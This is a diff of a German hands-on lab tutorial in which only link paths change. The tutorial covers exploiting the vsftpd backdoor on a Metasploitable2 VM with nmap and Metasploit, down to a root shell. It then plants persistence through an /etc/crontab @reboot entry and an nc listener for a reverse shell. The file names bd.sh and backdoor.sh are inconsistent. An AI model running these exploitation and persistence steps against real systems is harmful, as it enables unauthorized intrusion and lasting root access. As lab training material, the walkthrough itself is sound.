@@ -6,7 +6,7 @@ Wir wollen genau diese Schwachstellen dieser Maschine herausfinden und uns einen
 
 Dazu ist es notwendig, dass du Kali Linux, Metasploitable2 sowie pfSense in einer virtuellen Umgebung nutzen kannst. 
 
-Wir haben unser [Labnet](/cybersercurity/10-practice-labs/labnet_infos.md) über Virtualbox eingerichtet. Solltest du dies auch tun, gibt es unzählige Guides im Internet, die dir dabei helfen, ein Labnet einzurichten.
+Wir haben unser [Labnet](/10-practice-labs/labnet_infos.md) über Virtualbox eingerichtet. Solltest du dies auch tun, gibt es unzählige Guides im Internet, die dir dabei helfen, ein Labnet einzurichten.
 
 Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Metasploitable2 und pfSense).
 
@@ -37,7 +37,7 @@ Scanne das Netzwerk, um das Zielsystem zu identifizieren:
 sudo nmap -sP 192.168.1.0/24
 ```
 
-![Metasploit nmap scan](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd1.png)
+![Metasploit nmap scan](/10-practice-labs/ressources/pictures/metasploit-vsftpd1.png)
 
 Wir scannen bewusst das gesamten Netzwerk mit dem Präfix `/24` und der IP-Adresse `192.168.1.0`, um 
 herauszufinden, welche Geräte sich in diesem Netzwerk befinden.
@@ -77,7 +77,7 @@ nmap -sS -sV 192.168.1.102
 - **`-sS`:** Dieser Switch scannt tausende Ports in kurzer Zeit und nutzt dabei SYN-Pakete um die Server zu erreichen. Wird auch als `half-open scan` bezeichnet, weil keine ACK stattfindet.
 - **`-sV`:** findet heraus, welche Programme den Port belauschen.
 
-Mehr zu SYN und ACK findest du in unserem [TCP-Guide](/cybersercurity/02-network-security/tcp_ip_basics.md).
+Mehr zu SYN und ACK findest du in unserem [TCP-Guide](/02-network-security/tcp_ip_basics.md).
 
 **ODER**
 
@@ -93,7 +93,7 @@ PORT   STATE SERVICE VERSION
 ```
 Diese Version ist bekannt verwundbar für eine Backdoor-Shell über speziell formatierte Login-Daten.
 
-![nmap Versionsscan](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd2.png)
+![nmap Versionsscan](/10-practice-labs/ressources/pictures/metasploit-vsftpd2.png)
 
 
 - **PORT:** Listet alle Ports auf, die mit der IP-Adresse verknüpft sind.
@@ -112,7 +112,7 @@ ob der Port offen oder tatsächlich geschlossen ist. Sollte eine Firewall hinter
 deine IP-Adresse).
 
 
-In unserem [nmap Guide](/cybersercurity/02-network-security/tools/nmap.md) erhältst du mehr Infos.
+In unserem [nmap Guide](/02-network-security/tools/nmap.md) erhältst du mehr Infos.
 
 ---
 ## 3. 💥 Exploitation mit Metasploit
@@ -125,7 +125,7 @@ Starte Metasploit in dem du folgenden Befehl in das Kali Linux Terminal eingibst
 msfconsole
 ```
 
-![msfconsole starten](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd3.png)
+![msfconsole starten](/10-practice-labs/ressources/pictures/metasploit-vsftpd3.png)
 
 Nachdem msfconsole erfolgreich gestartet ist, wirst du merken, dass sich die Anzeige geändert hat. Das liegt daran, dass wir nun im der Shell des Programm `msfconsole` sind.
 
@@ -138,7 +138,7 @@ Um das passende Exploit-Modul zu suchen, gib einfach in die `msfconsole` folgend
 search vsftpd
 ```
 
-![Exploit-Modul suchen](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
+![Exploit-Modul suchen](/10-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
 
 ### 3.3 Exploit nutzen
 
@@ -152,7 +152,7 @@ Der Befehl `use` ist selbstaussagend und die `1` steht für die Nummer des Explo
 
 Dein Terminal sollte nun folgendermaßen aussehen:
 
-![Exploit-Modul nutzen](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd5.png)
+![Exploit-Modul nutzen](/10-practice-labs/ressources/pictures/metasploit-vsftpd5.png)
 
 
 **Was ist bisher passiert?**
@@ -171,7 +171,7 @@ Wir haben `msfconsole` geöffnet und nach der Version gesucht und waren erfolgre
 
 Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit hast. 
 
-![msfconsole option-Befehl](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
+![msfconsole option-Befehl](/10-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
 
 Für uns sind hier an dieser Stelle nur der `RHOST` und `RPORT` wichtig, da wir nicht über einen Proxy laufen oder sonst locale Clients haben.
 
@@ -186,7 +186,7 @@ set RHOSTS 192.168.1.102
 set RPORT 21
 ```
 
-![msfconsole RHOST und RPORT Konfiguration](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd7.png)
+![msfconsole RHOST und RPORT Konfiguration](/10-practice-labs/ressources/pictures/metasploit-vsftpd7.png)
 
 Du könntest noch einmal den Befehl `options` eingeben, um zu überprüfen, ob deine Konfigurationen überommen worden sind, aber dies Bedarf es im Regelfall nicht.
 
@@ -205,7 +205,7 @@ Wenn alles erfolgreich ist, dann erhältst du folgende Meldung über das Termina
 [*] Backdoor service has been spawned
 [*] Command shell session 1 opened
 ```
-![msfconsole Exploit start](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd8.png)
+![msfconsole Exploit start](/10-practice-labs/ressources/pictures/metasploit-vsftpd8.png)
 
 **Für Fortgeschrittene:**
 Wenn du bereits weißt, welchen Exploit du verwenden willst, kannst du das Exploit-Modul direkt auswählen und die Einstellungen vornehmen:
@@ -239,11 +239,11 @@ Dazu habe ich in beiden Terminals den Befehl `whoami` eingegeben. Der `whoami`-B
 
 Kali zeigt mir den folgenden User:
 Das heißt, ich bin in meiner Kali Maschine der Nutzer mit dem Name Kali
-![Kali whoami](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd9.png)
+![Kali whoami](/10-practice-labs/ressources/pictures/metasploit-vsftpd9.png)
 
 Metasploitable2 zeigt mir folgende User:
 Metasploitable2 hingegen zeigt mir, dass ich der Root Nutzer bin.
-![Metasploitable2 whoami](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd10.png)
+![Metasploitable2 whoami](/10-practice-labs/ressources/pictures/metasploit-vsftpd10.png)
 
 ---
 
@@ -263,14 +263,14 @@ chmod +x /tmp/bd.sh
 echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab
 ```
 
-![Backdoor erstellen](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd11.png)
+![Backdoor erstellen](/10-practice-labs/ressources/pictures/metasploit-vsftpd11.png)
 
 Mit dem Befehl `cat /tmp/backdoor.sh` kannst du die Datei anzeigen lassen. Gib dazu einfach im Terminal folgenden Befehl ein:
 ```
 cat /tmp/backdoor.sh
 ```
 
-![Backdoor-Bash-Script anzeigen](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd13.png)
+![Backdoor-Bash-Script anzeigen](/10-practice-labs/ressources/pictures/metasploit-vsftpd13.png)
 
 
 3. Starte Listener auf Kali:
@@ -278,7 +278,7 @@ cat /tmp/backdoor.sh
 nc -lvnp 4444
 ```
 
-![Backdoor erstellen](/cybersercurity/10-practice-labs/ressources/pictures/metasploit-vsftpd12.png)
+![Backdoor erstellen](/10-practice-labs/ressources/pictures/metasploit-vsftpd12.png)
 
 Beim nächsten Reboot von Metasploitable2 verbindet sich die Shell zu deinem Kali.
 
@@ -346,7 +346,7 @@ Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
 Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch 
 und rechtlich korrekt handeln.
 
-[Disclaimer](/cybersercurity/00-disclaimer/disclaimer.md)
+[Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
 
